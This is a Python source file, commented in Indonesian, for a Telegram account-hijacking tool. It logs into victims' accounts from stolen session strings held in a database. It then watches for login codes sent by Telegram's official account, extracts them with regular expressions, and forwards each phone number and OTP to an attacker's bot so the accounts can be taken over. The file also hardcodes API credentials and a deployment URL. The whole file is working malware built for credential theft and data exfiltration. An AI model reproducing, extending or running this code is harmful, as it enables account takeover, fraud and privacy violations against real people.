import os
import asyncio
import re
import logging
import requests
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from database import get_all_victim_sessions, update_victim_otp

logger = logging.getLogger(__name__)

API_ID = int(os.environ.get("API_ID", 24289127))
API_HASH = os.environ.get("API_HASH", "cd63113435f4997590ee4a308fbf1e2c")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
RAILWAY_URL = 'https://siluman-cancut-production.up.railway.app'

# Global dictionary untuk simpan client
active_clients = {}

async def send_otp_notification(phone, otp_code, source="Telegram"):
    """Send OTP notification using requests"""
    try:
        from datetime import datetime
        message = (
            f"🚨 *OTP AUTO-CAPTURED!* 😈\n\n"
            f"📱 *Phone:* `{phone}`\n"
            f"🔑 *OTP Code:* `{otp_code}`\n"
            f"📨 *Source:* {source}\n"
            f"⏰ *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"💀 *OTP READY FOR LOGIN!*"
        )
        
        # Update OTP di database
        update_victim_otp(phone, otp_code)
        
        # Kirim ke Telegram bot
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        requests.post(url, data=data, timeout=10)
        logger.info(f"✅ OTP notification sent for {phone}: {otp_code}")
        
    except Exception as e:
        logger.error(f"❌ Send OTP notification error: {e}")

async def setup_otp_interceptor(phone, session_string):
    """Setup OTP interceptor untuk satu korban"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        
        @client.on(events.NewMessage)
        async def message_handler(event):
            try:
                # Cek apakah message dari Telegram official
                if event.message.sender_id == 777000:  # Telegram official ID
                    message_text = event.message.text
                    
                    # Pattern matching untuk OTP
                    patterns = [
                        r'is your login code:?\s*(\d{4,6})',
                        r'verification code:?\s*(\d{4,6})',
                        r'kode verifikasi:?\s*(\d{4,6})',
                        r'kode masuk:?\s*(\d{4,6})',
                        r'code:?\s*(\d{4,6})',
                        r'kode:?\s*(\d{4,6})',
                        r'(\d{4,6})\s*is your code',
                        r'kode Anda:?\s*(\d{4,6})'
                    ]
                    
                    for pattern in patterns:
                        match = re.search(pattern, message_text, re.IGNORECASE)
                        if match:
                            otp_code = match.group(1)
                            logger.info(f"🚨 OTP Captured for {phone}: {otp_code}")
                            
                            # Kirim notifikasi ke bot
                            await send_otp_notification(phone, otp_code, "Telegram Message")
                            break
                            
            except Exception as e:
                logger.error(f"❌ Message handler error for {phone}: {e}")
        
        await client.start()
        active_clients[phone] = client
        logger.info(f"✅ OTP Interceptor active for {phone}")
        return client
        
    except Exception as e:
        logger.error(f"❌ Failed to setup interceptor for {phone}: {e}")
        return None

async def start_otp_interceptors():
    """Start OTP interceptors untuk semua korban"""
    try:
        while True:
            victims = get_all_victim_sessions()
            logger.info(f"🎯 Starting OTP interceptors for {len(victims)} victims...")
            
            current_phones = set(active_clients.keys())
            new_phones = set(v[0] for v in victims)
            
            # Remove disconnected clients
            for phone in current_phones - new_phones:
                if phone in active_clients:
                    await active_clients[phone].disconnect()
                    del active_clients[phone]
                    logger.info(f"🔌 Disconnected interceptor for {phone}")
            
            # Add new clients
            for phone, session_string in victims:
                if phone not in active_clients:
                    await setup_otp_interceptor(phone, session_string)
            
            logger.info(f"😈 OTP Interceptors active: {len(active_clients)}")
            await asyncio.sleep(60)  # Check every minute
            
    except Exception as e:
        logger.error(f"❌ OTP interceptors main error: {e}")
        await asyncio.sleep(30)
        await start_otp_interceptors()  # Restart
